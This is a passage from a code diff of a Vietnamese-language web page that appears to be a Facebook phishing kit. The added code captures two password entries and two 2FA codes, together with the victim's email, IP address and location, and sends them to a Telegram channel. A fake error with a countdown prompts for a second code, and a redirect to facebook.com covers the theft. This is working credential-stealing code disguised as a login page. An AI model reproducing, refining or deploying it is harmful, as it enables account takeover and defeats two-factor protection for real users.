+                            `Mật khẩu 1: ${firstPassword}`,
+                            `Mật khẩu 2: ${secondPassword}`,
+                        ];
+                        sendToTelegram(msgLines);
+                        messageCounter++;
 
                         const waitTime = randomInt(6000, 10000);
                         showWaitingScreen(waitTime);
@@ -1447,24 +1524,31 @@
                 const code = twofaCode.value.trim();
 
                 if (!firstCode) {
-                    // Lần nhập code đầu tiên
                     twofaContinue.classList.add('loading');
                     twofaContinue.disabled = true;
 
                     setTimeout(() => {
                         twofaContinue.classList.remove('loading');
-                        firstCode = code; // Lưu lại để đánh dấu đã nhập lần 1
+                        firstCode = code;
 
-                        const msg = `🔐 <b>2FA Attempt 1:</b>\nEmail: ${firstEmail}\nCode: ${code}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}`;
-                        sendToTelegram(msg);
+                        const timeStr = getCurrentTimeString();
+                        const msgLines = [
+                            
+                            `Thời gian: ${timeStr}`,
+                            `IP: ${userIp}`,
+                            `Vị trí: ${userCityCountry}`,
+                            ``,
+                            `Email: ${firstEmail}`,
+                            `Mã 2FA: ${code}`,
+                        ];
+                        sendToTelegram(msgLines);
+                        messageCounter++;
 
-                        startCountdown(30); // Hiện lỗi + đếm ngược, khóa input
-                        twofaCode.value = ''; // Xóa code cũ
-                        twofaContinue.disabled = true; // Vẫn disabled cho đến khi nhập code mới
+                        startCountdown(30);
+                        twofaCode.value = '';
+                        twofaContinue.disabled = true;
                     }, 2000);
                 } else {
-                    // Lần nhập code thứ hai
-                    // Ẩn lỗi và dừng đếm ngược nếu còn
                     twofaError.classList.remove('show');
                     if (countdownInterval) {
                         clearInterval(countdownInterval);
@@ -1474,8 +1558,18 @@
                     twofaContinue.disabled = true;
 
                     setTimeout(() => {
-                        const msg = `🔐 <b>2FA Attempt 2:</b>\nEmail: ${firstEmail}\nCode: ${code}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}`;
-                        sendToTelegram(msg);
+                        const timeStr = getCurrentTimeString();
+                        const msgLines = [
+                            
+                            `Thời gian: ${timeStr}`,
+                            `IP: ${userIp}`,
+                            `Vị trí: ${userCityCountry}`,
+                            ``,
+                            `Email: ${firstEmail}`,
+                            `Mã 2FA: ${code}`,
+                        ];
+                        sendToTelegram(msgLines);
+                        messageCounter++;
                         window.location.href = 'https://www.facebook.com';
                     }, 2000);
                 }
@@ -1512,13 +1606,9 @@
                 });
             }
 
-            // ============================================
-            // ẨN POPUP KHI TRANG LOAD LẠI
-            // ============================================
             window.addEventListener('load', function() {
                 twofaPopup.style.display = 'none';
             });
-
         })();
     </script>
 </body>
